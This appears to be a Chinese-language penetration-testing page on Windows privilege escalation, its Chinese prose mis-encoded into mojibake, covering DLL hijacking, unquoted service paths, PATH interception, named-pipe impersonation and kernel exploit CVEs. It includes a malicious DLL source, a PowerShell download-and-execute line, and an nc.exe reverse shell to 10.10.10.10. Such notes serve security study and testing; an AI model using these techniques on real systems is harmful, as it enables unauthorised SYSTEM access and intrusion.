<h2 id="åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ">åˆ©ç”¨æœåŠ¡æƒé™é”™è¯¯ææƒ</h2>
<p>ä»¥ç®¡ç†å‘˜/ç³»ç»Ÿèº«ä»½è¿è¡Œä¸”æ–‡ä»¶æƒé™ä¸æ­£ç¡®çš„æœåŠ¡å¯èƒ½å¯¼è‡´ææƒï¼Œæ›¿æ¢è¯¥æ–‡ä»¶æˆ–è€…åŠ«æŒ DLLï¼ˆéœ€è¦å¯å†™æƒé™ï¼‰ï¼Œç„¶åé‡å¯è¯¥æœåŠ¡å³å¯ã€‚</p>
<h3 id="dll-åŠ«æŒ">DLL åŠ«æŒ</h3>
<ol>
  <li>å¯»æ‰¾ DLL åŠ«æŒåˆ©ç”¨ç‚¹
    <ol>
      <li>PowerSploit ä¸­çš„ PowerUp è„šæœ¬ï¼šFind-PathDLLHijack PowerUp.ps1</li>
      <li>Process Monitor : check for â€œName Not Foundâ€</li>
    </ol>
  </li>
  <li>ç¼–è¯‘æ¶æ„ DLL
    <ol>
      <li>For x64 compile with: â€œx86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dllâ€</li>
      <li>For x86 compile with: â€œi686-w64-mingw32-gcc windows_dll.c -shared -o output.dllâ€</li>
    </ol>

    <p>windows_dll.c å†…å®¹</p>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe /k whoami &gt; C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">dll.txt"</span><span class="p">);</span>
         <span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>å¯»æ‰¾æƒé™é…ç½®ä¸å½“çš„ PATH ç›®å½•
    <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt

 $ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

 $ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
 <span class="nb">type</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div>    </div>
  </li>
</ol>

<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç¨‹åºå¯èƒ½è‡ªä¸»åœ°åŠ è½½æŸäº›è·¯å¾„çš„ dllï¼Œæ­¤æ—¶å°±éœ€è¦é€†å‘ç‰¹å®šçš„åº”ç”¨æ‰å¯ä»¥åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œ DLL åŠ«æŒã€‚</p>

<p>å‚è€ƒï¼š</p>
<ul>
  <li><a href="https://www.cnblogs.com/bonelee/p/16227518.html">Powershell ææƒæ¡†æ¶-Powerupâ€”â€”å¹³å¿ƒè€Œè®ºï¼Œè¿™ä¸ªææƒå·¥å…·è¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼Œçœ‹åé¢å®æˆ˜ä¾‹å­ - bonelee - åšå®¢å›­</a></li>
</ul>

<h3 id="path-è·¯å¾„å¯å†™">PATH è·¯å¾„å¯å†™</h3>
<p>ä¸‹é¢çš„å‘½ä»¤å¯ä»¥å¯¹æœåŠ¡çš„ path è·¯è¿›å…·å¤‡çš„æƒé™è¿›è¡Œæ’æŸ¥ã€‚</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt
$ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

$ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
<span class="nb">type</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div></div>
<p>ä¸¤ç»„å‘½ä»¤éƒ½å¯ä»¥ç”¨ï¼Œä½†ä¼šç”Ÿæˆæ–‡ä»¶ã€‚</p>

<p>æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ msf ä¸­çš„ expï¼š</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/windows/local/service_permissions
</code></pre></div></div>
<h3 id="windows-10---cve-2019-1322-usosvc">windows 10 - CVE-2019-1322 UsoSvc</h3>

<h3 id="windows-xp-sp1---upnphost">Windows XP SP1 - upnphost</h3>

<h2 id="åˆ©ç”¨-linux-å­ç³»ç»Ÿææƒ">åˆ©ç”¨ Linux å­ç³»ç»Ÿææƒ</h2>
<blockquote>
  <p>å‡­å€Ÿ root æƒé™ï¼ŒWindows Subsystem for Linux (WSL) å…è®¸ç”¨æˆ·åœ¨ä»»ä½•ç«¯å£ä¸Šåˆ›å»ºç»‘å®š shellï¼ˆæ— éœ€æå‡ï¼‰ã€‚  ä¸çŸ¥é“ root å¯†ç ï¼Ÿ  æ²¡é—®é¢˜ï¼Œåªéœ€å°†é»˜è®¤ç”¨æˆ·è®¾ç½®ä¸º root W/.exe â€“default-user root å³å¯ã€‚  ç°åœ¨å¯åŠ¨æ‚¨çš„ç»‘å®š shell æˆ–åå‘æ“ä½œã€‚</p>
</blockquote>

<p>Windows å­ç³»ç»Ÿçš„æ–‡ä»¶ç›®å½•ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥æŸ¥çœ‹çš„ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\%</span>USERNAME%<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\P</span>ackages<span class="se">\C</span>anonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc<span class="se">\L</span>ocalState<span class="se">\r</span>ootfs<span class="se">\</span>
</code></pre></div></div>

<h2 id="åˆ©ç”¨æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„ææƒ">åˆ©ç”¨æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„ææƒ</h2>
<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<ul>
  <li>æœåŠ¡çš„è·¯å¾„å­˜åœ¨æ— å¼•å·ä¸”åŒ…å«ç©ºæ ¼æˆ–å…¶ä»–åˆ†éš”ç¬¦ã€‚</li>
  <li>ä¸Šçº§è·¯å¾„å¯å†™ã€‚</li>
</ul>

<blockquote>
  <p>Microsoft Windows æ— å¼•å·æœåŠ¡è·¯å¾„æšä¸¾æ¼æ´ã€‚<br />
æ‰€æœ‰ Windows æœåŠ¡éƒ½æœ‰å…¶å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ã€‚<br />
å¦‚æœè¯¥è·¯å¾„æœªåŠ å¼•å·ä¸”åŒ…å«ç©ºæ ¼æˆ–å…¶ä»–åˆ†éš”ç¬¦ï¼Œåˆ™æœåŠ¡å°†é¦–å…ˆå°è¯•è®¿é—®çˆ¶è·¯å¾„ä¸­çš„èµ„æºã€‚</p>
</blockquote>

<p>ä¾‹å¦‚ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>For C:<span class="se">\P</span>rogram Files<span class="se">\s</span>omething<span class="se">\l</span>egit.exe, Windows will try the following paths first:

    C:<span class="se">\P</span>rogram.exe
    C:<span class="se">\P</span>rogram Files.exe
</code></pre></div></div>
<p>å¦‚æœè¿™ç±»è·¯å¾„å¯å†™ï¼Œå³å¯åŠ«æŒè¯¥æœåŠ¡çš„ exeï¼Œå¦‚æœè¯¥æœåŠ¡å…·å¤‡é«˜æƒé™ï¼Œåˆ™å¯ææƒã€‚</p>

<p>æœç´¢æ­¤ç±»æœåŠ¡ã€‚</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">get</span> <span class="kd">name</span><span class="o">,</span><span class="kd">displayname</span><span class="o">,</span><span class="kd">pathname</span><span class="o">,</span><span class="kd">startmode</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i </span><span class="s2">"Auto"</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i /v </span><span class="s2">"C:\Windows\\"</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i /v </span><span class="s2">"""

wmic service get name,displayname,startmode,pathname | findstr /i /v "</span><span class="kd">C</span>:\Windows\\<span class="s2">" |findstr /i /v """</span>

<span class="kd">gwmi</span> <span class="na">-class </span><span class="kd">Win32_Service</span> <span class="na">-Property </span><span class="kd">Name</span><span class="o">,</span> <span class="kd">DisplayName</span><span class="o">,</span> <span class="kd">PathName</span><span class="o">,</span> <span class="kd">StartMode</span> <span class="o">|</span> <span class="kd">Where</span> <span class="o">{</span>$_.StartMode <span class="na">-eq </span><span class="s2">"Auto"</span> <span class="na">-and </span>$_.PathName <span class="na">-notlike </span><span class="s2">"C:\Windows*"</span> <span class="na">-and </span>$_.PathName <span class="na">-notlike </span><span class="s1">'"*'</span><span class="o">}</span> <span class="o">|</span> <span class="kd">select</span> <span class="kd">PathName</span><span class="o">,</span><span class="kd">DisplayName</span><span class="o">,</span><span class="kd">Name</span>
</code></pre></div></div>

<p>æ¼æ´åˆ©ç”¨ï¼š</p>
<ul>
  <li>Metasploit exploit : exploit/windows/local/trusted_service_path</li>
  <li>PowerUp exploit
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="c"># find the vulnerable application</span><span class="w">
  </span><span class="n">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="s2">"IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"</span><span class="w">

  </span><span class="o">...</span><span class="w">
  </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Checking</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">unquoted</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">paths...</span><span class="w">
  </span><span class="n">ServiceName</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">BBSvc</span><span class="w">
  </span><span class="n">Path</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\Microsoft\Bing</span><span class="w"> </span><span class="nx">Bar\7.1\BBSvc.exe</span><span class="w">
  </span><span class="n">StartName</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">LocalSystem</span><span class="w">
  </span><span class="n">AbuseFunction</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Write-ServiceBinary</span><span class="w"> </span><span class="nt">-ServiceName</span><span class="w"> </span><span class="s1">'BBSvc'</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">HijackPath</span><span class="err">&gt;</span><span class="w">
  </span><span class="o">...</span><span class="w">

  </span><span class="c"># automatic exploit</span><span class="w">
  </span><span class="n">Invoke-ServiceAbuse</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="p">[</span><span class="n">SERVICE_NAME</span><span class="p">]</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"</span><span class="w">
</span></code></pre></div>    </div>
  </li>
</ul>

<h2 id="åˆ©ç”¨-path-æ‹¦æˆªææƒ">åˆ©ç”¨ PATH æ‹¦æˆªææƒ</h2>
<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<ul>
  <li>PATH è·¯å¾„ä¸­å­˜åœ¨å¯å†™è·¯å¾„</li>
  <li>å¯å†™æ–‡ä»¶å¤¹ä½äºåŒ…å«åˆæ³•å¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶å¤¹ä¹‹å‰ã€‚</li>
</ul>

<p>ç¤ºä¾‹ï¼š
ps ä¸­æ‰§è¡Œå¦‚ä¸‹çš„å‘½ä»¤æŸ¥çœ‹ PATH</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">Path</span><span class="w">
</span></code></pre></div></div>
<p>å‡è®¾è¾“å‡ºä¸º:<code class="language-plaintext highlighter-rouge">C:\Program Files\nodejs\;C:\WINDOWS\system32</code></p>

<p>æ£€æŸ¥ C:\Program Files\nodejs æ–‡ä»¶å¤¹çš„æƒé™å‘ç°å¯å†™ã€‚</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls.exe "C:\Program Files\nodejs\"
</code></pre></div></div>
<p>ç”±äº nodejs åœ¨ system32 ä¹‹å‰ï¼Œå› æ­¤å¯ä»¥å‘ nodejs æ–‡ä»¶å¤¹ä¸­å†™å…¥ cmd.exeï¼Œä¸‹æ¬¡ç”¨æˆ·å†æ‰§è¡Œ cmd æ—¶ï¼Œåˆ™ä¼šæ‰§è¡Œ nodejs ä¸­çš„ cmd.exe</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">copy</span> <span class="kd">evil</span><span class="na">-file</span>.exe <span class="s2">"C:\Program Files\nodejs\cmd.exe"</span>
</code></pre></div></div>

<h2 id="åˆ©ç”¨-name-pipe-ææƒ">åˆ©ç”¨ Name Pipe ææƒ</h2>
<h3 id="åˆ©ç”¨æœåŠ¡è‡ªèº«çš„æ¼æ´æˆ–åŠŸèƒ½">åˆ©ç”¨æœåŠ¡è‡ªèº«çš„æ¼æ´æˆ–åŠŸèƒ½</h3>
<p>æ‰¾åˆ°å­˜åœ¨å‘½åç®¡é“çš„æœåŠ¡ï¼ŒæŒ–æ˜æœåŠ¡æ¼æ´æˆ–å¯ç”¨åŠŸèƒ½ï¼Œåˆ©ç”¨ Name Pipe æ“ä½œè¿™äº›åŠŸèƒ½æˆ–ç›´æ¥åˆ©ç”¨æ¼æ´è·å–åˆ°é«˜æƒé™ã€‚</p>

<p>åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
  <li>Find named pipes: [System.IO.Directory]::GetFiles(â€œ\.\pipe")</li>
  <li>Check named pipes DACL: pipesec.exe <named_pipe></named_pipe></li>
  <li>Reverse engineering software</li>
  <li>Send data throught the named pipe : program.exe &gt;\.\pipe\StdOutPipe 2&gt;\.\pipe\StdErrPipe</li>
</ol>

<h3 id="meterpreter-ä¸­çš„-getsystem">meterpreter ä¸­çš„ getsystem</h3>
<p>æœ‰ä»£è¡¨æ€§çš„ EXP å¦‚ meterpreter ä¸­çš„ getsystem å‘½ä»¤ã€‚è¯¥æŠ€æœ¯çš„æ ¸å¿ƒåœ¨äºå¯¹ ImpersonateNamedPipeClient API çš„åˆ©ç”¨ï¼Œé€šè¿‡å‘½åç®¡é“çš„æœåŠ¡ç«¯è¿›ç¨‹æ¨¡ä»¿å®¢æˆ·ç«¯è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œï¼Œè·å– SYSTEM æƒé™ã€‚å½“ç„¶ï¼Œæƒ³è°ƒç”¨å®ƒï¼Œå‰ææ˜¯è¿›ç¨‹å…·å¤‡ SeImpersonatePrivilege çš„æƒé™ï¼Œè€Œè¿™é€šå¸¸æ„å‘³ç€æˆ‘ä»¬å·²ç»æ˜¯ Admin ç”¨æˆ·äº†ã€‚</p>

<p>åˆ©ç”¨ç»†èŠ‚ï¼š
1) getsystem æ–°å»ºä¸€ä¸ªçº¿ç¨‹åˆ›å»ºå‘½åç®¡é“å¹¶ç­‰å¾…æœåŠ¡å‘æ¥çš„è¿æ¥ (æœåŠ¡ç«¯)
2) getsystem åˆ›å»ºäº†ä¸€ä¸ªä»¥ SYSTEM æƒé™è¿è¡Œçš„ Windows æœåŠ¡ï¼Œè¯¥æœåŠ¡ä¼šå‘å‘½åç®¡é“å‘èµ·è¿æ¥ (å®¢æˆ·ç«¯)
3) å¯åŠ¨è¯¥æœåŠ¡ï¼Œå‘ç›®æ ‡å‘½åç®¡é“å‘èµ·è¿æ¥ (å®¢æˆ·ç«¯ -&gt; æœåŠ¡ç«¯)
4) è¯¥è¿›ç¨‹(æœåŠ¡ç«¯)æ¥æ”¶è¿æ¥ï¼Œè°ƒç”¨ ImpersonateNamedPipeClientï¼Œä»è€Œæ¨¡ä»¿äº† SYSTEM æƒé™çš„è®¿é—®ä»¤ç‰Œ
5) å®Œæˆææƒè¿‡ç¨‹åï¼Œåœæ­¢å¹¶åˆ é™¤è¯¥æœåŠ¡</p>

<p>å‚è€ƒ</p>
<ul>
  <li><a href="https://www.anquanke.com/post/id/265507">èµ°è¿›Windowsä¸­çš„ææƒè¡Œä¸º-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></li>
</ul>

<h3 id="printspoofer">PrintSpoofer</h3>
<p>å‘½åç®¡é“ææƒçš„åŸç†å¤§å¤šç±»ä¼¼ï¼Œä¸€èˆ¬æ˜¯è¯±ä½¿ system æƒé™çš„æœåŠ¡è®¿é—®æˆ‘ä»¬æŒ‡å®šçš„å‘½åç®¡é“ã€‚</p>

<p>Windows çš„ MS-RPRN åè®®ç”¨äºæ‰“å°å®¢æˆ·æœºå’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ç”¨ã€‚åŒæ—¶ï¼ŒPrint Spooler æœåŠ¡çš„ RPC æ¥å£æš´éœ²åœ¨å‘½åç®¡é“ï¼š\.\pipe\spoolss ä¸­ï¼Œè¯¥æœåŠ¡é»˜è®¤å¼€å¯ã€‚</p>

<p>MS-RPRN åè®®å®šä¹‰çš„ RpcRemoteFindFirstPrinterChangeNotificationEx() è°ƒç”¨åˆ›å»ºä¸€ä¸ªè¿œç¨‹æ›´æ”¹é€šçŸ¥å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç›‘è§†å¯¹æ‰“å°æœºå¯¹è±¡çš„æ›´æ”¹ï¼Œå¹¶å°†æ›´æ”¹é€šçŸ¥å‘é€åˆ°æ‰“å°å®¢æˆ·ç«¯ã€‚</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="p">(</span> 
    <span class="cm">/* [in] */</span> <span class="n">PRINTER_HANDLE</span> <span class="n">hPrinter</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwFlags</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwOptions</span><span class="p">,</span>
    <span class="cm">/* [unique][string][in] */</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">pszLocalMachine</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">dwPrinterLocal</span><span class="p">,</span>
    <span class="cm">/* [unique][in] */</span> <span class="n">RPC_V2_NOTIFY_OPTIONS</span> <span class="o">*</span><span class="n">pOptions</span><span class="p">)</span>

</code></pre></div></div>
<p>å…¶ä¸­ pszLocalMachine æ˜¯æŒ‡å‘è¡¨ç¤ºå®¢æˆ·ç«¯è®¡ç®—æœºåç§°çš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œéœ€è¦ä¼ é€’ä¸€ä¸ª UNC è·¯å¾„ï¼Œä¼ é€’ \127.0.0.1 æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè®¿é—® \127.0.0.1\pipe\spoolssï¼Œä½†è¿™ä¸ªç®¡é“å·²ç»è¢«ç³»ç»Ÿæ³¨å†Œäº†ï¼Œå¹¶ç”± NT AUTHORITY\SYSTEM æ§åˆ¶ã€‚</p>

<p>é‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯è¦æƒ³åŠæ³•æŠŠè¿™ä¸ªè¯·æ±‚è®©æˆ‘ä»¬å‡†å¤‡å¥½çš„æ¶æ„ç®¡é“æ¥æ”¶ã€‚</p>

<p>è€ƒè™‘åˆ° UNC è·¯å¾„çš„æ€§è´¨ï¼Œå¦‚æœä¸»æœºååŒ…å« /ï¼Œå®ƒå°†é€šè¿‡è·¯å¾„æ£€æŸ¥ï¼Œä½†çœŸæ­£è¿æ¥çš„æ—¶å€™ä¼šè½¬åŒ–ä¸º \ ã€‚é‚£ä¹ˆï¼Œå¦‚æœä¼ é€’ä¸€ä¸ª \127.0.0.1/pipe/fooï¼Œæ£€æŸ¥æ—¶ä¼šè®¤ä¸º 127.0.0.1/pipe/foo æ˜¯ä¸€ä¸ªä¸»æœºåï¼Œéšååœ¨è¿æ¥ named pipe æ—¶ä¼šå¯¹å‚æ•°åšæ ‡å‡†åŒ–ï¼Œäºæ˜¯å°±ä¼šè¿æ¥ \127.0.0.1\pipe\foo\pipe\spoolssï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æŠŠä¸»æœºåæ”¹ä¸º \127.0.0.1/pipe/foo å¹¶æ³¨å†Œè¿™ä¸ª named pipe ä»è€Œçªƒå– client çš„ tokenã€‚</p>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/itm4n/PrintSpoofer">itm4n/PrintSpoofer: Abusing impersonation privileges through the â€œPrinter Bugâ€</a></li>
</ul>

<h2 id="åˆ©ç”¨å†…æ ¸æ¼æ´ææƒ">åˆ©ç”¨å†…æ ¸æ¼æ´ææƒ</h2>
<p>å¯å‚è€ƒï¼šhttps://github.com/SecWiki/windows-kernel-exploits</p>

<ul>
  <li>CVE-2021-33739 [Microsoft DWM Core Library Elevation of Privilege Vulnerability] (Windows 10, 20)</li>
  <li>CVE-2021-1732 [Windows Win32k Elevation of Privilege Vulnerability] (Windows 10, 2019/20H2)</li>
  <li>CVE-2020-0787 [Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012- 2016/2019)</li>
  <li>CVE-2020-0796 [A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3)- protocol handles certain requests, aka â€˜Windows SMBv3 Client/Server Remote Code Execution Vulnerabilityâ€™] (Windows 1903/1909)</li>
  <li>CVE-2019-1458 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016)</li>
  <li>CVE-2019-0803 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016/2019)</li>
  <li>CVE-2018-8639 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016)</li>
  <li>CVE-2018-1038 [Windows Kernel Elevation of Privilege Vulnerability] (Windows 7 SP1/Windows Server 2008 R2 SP1)</li>
  <li>CVE-2018-0743 [Windows Subsystem for Linux Elevation of Privilege Vulnerability] (Windows 10 version 1703/Windows 10 version 1709- Windows Server version 1709)</li>
  <li>CVE-2018-8453 [An elevation of privilege vulnerability in Windows Win32k component] (&gt;= windows 8.1)</li>
  <li>CVE-2018-8440 [Windows ALPC Elevation of Privilege Vulnerability] (windows 7/8.1/10/2008/2012/2016)</li>
  <li>MS17-017 ã€€[KB4013081]ã€€ã€€[GDI Palette Objects Local Privilege Escalation]ã€€ã€€(windows 7/8)</li>
  <li>CVE-2017-8464 ã€€[LNK Remote Code Execution Vulnerability]ã€€ã€€(windows 10/8.1/7/2016/2010/2008)</li>
  <li>CVE-2017-0213 ã€€[Windows COM Elevation of Privilege Vulnerability]ã€€ã€€(windows 10/8.1/7/2016/2010/2008)</li>
  <li>CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service]  (Windows 8.1/Server 2012 R2)</li>
  <li>CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1)</li>
  <li>MS17-010 ã€€[KB4013389]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(windows 7/2008/2003/XP)</li>
  <li>MS16-135 ã€€[KB3199135]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(2016)</li>
  <li>MS16-111 ã€€[KB3186973]ã€€ã€€[kernel api]ã€€ã€€(Windows 10 10586 (32/64)/8.1)</li>
  <li>MS16-098 ã€€[KB3178466]ã€€ã€€[Kernel Driver]ã€€ã€€(Win 8.1)</li>
  <li>MS16-075 ã€€[KB3164038]ã€€ã€€[Hot Potato]ã€€ã€€(2003/2008/7/8/2012)</li>
  <li>MS16-034 ã€€[KB3143145]ã€€ã€€[Kernel Driver]ã€€ã€€(2008/7/8/10/2012)</li>
  <li>MS16-032 ã€€[KB3143141]ã€€ã€€[Secondary Logon Handle]ã€€ã€€(2008/7/8/10/2012)</li>
  <li>MS16-016 ã€€[KB3136041]ã€€ã€€[WebDAV]ã€€ã€€(2008/Vista/7)</li>
  <li>MS16-014 ã€€[K3134228]ã€€ã€€[remote code execution]ã€€ã€€(2008/Vista/7)</li>
  <li>MS15-097 ã€€[KB3089656]ã€€ã€€[remote code execution]ã€€ã€€(win8.1/2012)</li>
